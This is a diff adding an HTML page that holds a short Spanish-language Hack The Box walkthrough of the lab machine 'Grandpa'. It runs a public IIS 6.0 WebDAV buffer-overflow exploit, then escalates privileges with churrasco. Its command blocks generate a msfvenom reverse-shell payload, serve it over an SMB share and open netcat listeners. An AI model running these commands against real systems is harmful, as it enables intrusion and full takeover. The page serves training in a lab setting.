@@ -1,0 +1,89 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Grandpa HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/grandpa/pasted-20260310164517.png" alt="Grandpa HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Grandpa</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>impersonación</span>
+            <span>potato</span>
+            <span>churrasco</span>
+            <span>iis_v6-0</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: IIS 6.0 expuesto</li>
+            <li><code>Explotación</code>: Buffer overflow en WebDAV/IIS mediante exploit público</li>
+            <li><code>Escalada de Privilegios</code>: Abuso de impersonación con churrasco</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración: Web IIS 6.0</h2>
+          <img class="writeup-image" src="/writeups/assets/grandpa/pasted-20260313001252.png" alt="Grandpa HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: IIS 6.0 vulnerable a BufferOverflow</h2>
+          <p><a href="https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/refs/heads/master/iis6%20reverse%20shell">PoC GitHub</a></p>
+          <div class="code-card">
+            <h3>Ejecutar PoC</h3>
+            <pre><code>python2.7 buff.py 10.129.95.233 80 10.10.16.69 443
+# Kali: Listener
+penelope -p 443</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/grandpa/pasted-20260313000902.png" alt="Grandpa HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Impersonate</h2>
+          <div class="code-card">
+            <h3>Enumerar permisos</h3>
+            <pre><code>whoami /all</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/grandpa/pasted-20260313000318.png" alt="Grandpa HTB" />
+          <div class="code-card">
+            <h3>Subir churrasco.exe</h3>
+            <pre><code># Kali: Payload
+msfvenom -p windows/x86/shell_reverse_tcp LHOST=10.10.16.69 LPORT=4443 -f exe &gt; shell.exe
+# Kali: Desde la ruta de churrasco
+impacket-smbserver SMB $(pwd)
+# Windows: Desde ruta con permisos
+copy \\10.10.16.69\SMB\churrasco.exe churrasco.exe
+copy \\10.10.16.69\SMB\shell.exe shell.exe
+# Kali: Listener
+rlwrap nc -nlvp 4443</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Ejecutar churrasco</h3>
+            <pre><code>churrasco.exe -d c:/windows/temp/shell.exe</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/grandpa/pasted-20260313000639.png" alt="Grandpa HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>impersonación</span>
+            <span>potato</span>
+            <span>churrasco</span>
+            <span>iis_v6-0</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
